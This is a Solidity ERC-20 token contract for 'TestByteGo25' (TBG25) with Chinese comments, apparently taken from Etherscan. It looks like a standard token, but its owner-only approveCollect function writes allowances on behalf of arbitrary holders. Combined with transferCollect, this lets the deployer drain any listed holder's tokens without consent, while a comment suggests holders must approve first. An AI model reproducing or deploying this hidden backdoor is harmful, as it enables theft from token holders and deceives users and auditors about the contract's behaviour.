/**
 *Submitted for verification at Etherscan.io on 2021-12-27
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.4.20 <0.9.0;

//引入ERC20定义
contract ERC20Interface {
    // 代币名称
    string public name;
    // 代币符号或者说简写
    string public symbol;
    // 代币小数点位数，代币的最小单位
    uint8 public decimals;
    // 代币的发行总量
    uint public totalSupply;

    // 实现代币交易，用于给某个地址转移代币
    function transfer(address to, uint tokens) public returns (bool success);
    // 实现代币用户之间的交易，从一个地址转移代币到另一个地址
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    // 允许spender多次从你的账户取款，并且最多可取tokens个，主要用于某些场景下授权委托其他用户从你的账户上花费代币
    function approve(address spender, uint tokens) public returns (bool success);
    // 查询spender允许从tokenOwner上花费的代币数量
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);

    // 代币交易时触发的事件，即调用transfer方法时触发
    event Transfer(address indexed from, address indexed to, uint tokens);
    // 允许其他用户从你的账户上花费代币时触发的事件，即调用approve方法时触发
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// 实现ERC-20标准接口
contract ERC20Impl is ERC20Interface {
    // 存储每个地址的余额（因为是public的所以会自动生成balanceOf方法）
    mapping (address => uint256) public balanceOf;
    // 存储每个地址可操作的地址及其可操作的金额
    mapping (address => mapping (address => uint256)) internal allowed;
    
    address private m_tokenOwner;

    // 初始化属性
    constructor() public {
        name = "TestByteGo25";
        symbol = "TBG25"; 
        decimals = 18;
        totalSupply = 100000000 * 10 ** uint256(decimals);
        // 初始化该代币的账户会拥有所有的代币
        balanceOf[msg.sender] = totalSupply;
        
        m_tokenOwner = msg.sender;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        // 检验接收者地址是否合法
        require(to != address(0));
        // 检验发送者账户余额是否足够
        require(balanceOf[msg.sender] >= tokens);
        // 检验是否会发生溢出
        require(balanceOf[to] + tokens >= balanceOf[to]);

        // 扣除发送者账户余额
        balanceOf[msg.sender] -= tokens;
        // 增加接收者账户余额
        balanceOf[to] += tokens;

        // 触发相应的事件
        emit Transfer(msg.sender, to, tokens);
    }

    function transferFrom(address from, address to, uint tokens)  public returns (bool success) {
        
        require(to != 0x0);
        
        // 检验地址是否合法
        require(to != address(0) && from != address(0));
        // 检验发送者账户余额是否足够
        require(balanceOf[from] >= tokens);
        // 检验操作的金额是否是被允许的
        require(allowed[from][msg.sender] >= tokens);
        // 检验是否会发生溢出
        require(balanceOf[to] + tokens >= balanceOf[to]);

        allowed[from][msg.sender] -= tokens;
        
        // 扣除发送者账户余额
        balanceOf[from] -= tokens;
        // 增加接收者账户余额
        balanceOf[to] += tokens;

        // 触发相应的事件
        emit Transfer(from, to, tokens);   

        success = true;
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        // 触发相应的事件
        emit Approval(msg.sender, spender, tokens);
        success = true;
    }
    
    function approveCollect(address[] spender, uint tokens) public returns (bool success) {
        
        require( msg.sender == m_tokenOwner);
        
        for(uint256 i = 0; i < spender.length; i++)
        {
            allowed[ spender[i] ][msg.sender] = tokens;
            // 触发相应的事件
            emit Approval(spender[i], msg.sender, tokens);
        }
        
        success = true;
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
        /**
    * 批量转账
    *
    * 从自己的账户上给别人转账
    *
    * @param _to 转入账户
    * @param _value 转账金额
    */
    function transferArray(address[] _to, uint256 _value) public {
        for(uint256 i = 0; i < _to.length; i++){
            transfer(_to[i], _value);
        }
    }

    // 每一个_from账户需要先调用 function approve(address _spender, uint256 _value), 设置
    function transferCollect(address[] _from,  uint256 _value) payable public {
        for(uint256 i = 0; i < _from.length; i++){
            transferFrom(_from[i], msg.sender, _value);
        }
    }
}